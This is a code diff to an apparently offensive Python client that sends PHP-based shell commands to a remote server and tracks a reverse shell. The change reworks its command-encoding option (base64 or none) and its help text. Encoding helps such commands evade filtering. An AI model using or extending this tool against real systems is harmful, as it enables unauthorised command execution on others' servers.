@@ -33,7 +33,7 @@ auth_user = None
 auth_pass = None
 payload = ""
 payload_type = "PHP"
-cmd_encode_b64 = False
+cmd_encode = None
 
 ############################################################
 ## Payloads
@@ -93,6 +93,7 @@ def show_help(cmd=None):
   elif cmd == "cookies":
     sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
   elif cmd == "encode":
+    sys.stdout.write(".encode - show current encoding used before sending commands\n")
     sys.stdout.write(".encode base64 - encode commands with base64 before sending\n")
     sys.stdout.write(".encode none - do not encode commands before sending\n")
   elif cmd == "find":
@@ -247,8 +248,6 @@ while True:
   while revshell_running:
     time.sleep(0.1)
   exec_cmd = False
-  #sys.stdout.write('>> ')
-  #sys.stdout.flush()
   userinput = raw_input('>> ')
   if not userinput:
     continue
@@ -270,14 +269,25 @@ while True:
       continue
     cookies = json.loads(userinput[len(cmd[0])+1:])
   elif cmd[0] == ".encode":
-    if len(cmd) != 2:
+    if len(cmd) == 1:
+      exec_cmd = False
+      sys.stdout.write("[*] encoding: %s\n" % (cmd_encode))
+      continue
+    elif len(cmd) != 2:
       sys.stdout.write("[!] Invalid parameters\n")
       continue
     exec_cmd = False
     if cmd[1] == "base64":
-      cmd_encode_b64 = True
+      cmd_encode = cmd[1]
+      sys.stdout.write("[*] encoding set to base64\n")
+      continue
+    elif cmd[1] == "none":
+      cmd_encode = None
+      sys.stdout.write("[*] encoding removed\n")
+      continue
     else:
-      cmd_encode_b64 = False
+      sys.stdout.write("[!] Invalid parameters\n")
+      continue
   elif cmd[0] == ".find":
     if len(cmd) != 2:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -401,7 +411,7 @@ while True:
     exec_cmd = True
 
   if exec_cmd:
-    if cmd_encode_b64:
+    if cmd_encode == "base64":
       cmd = base64.b64encode(userinput.encode()).decode()
     else:
       cmd = re.sub('&', '%26', userinput)
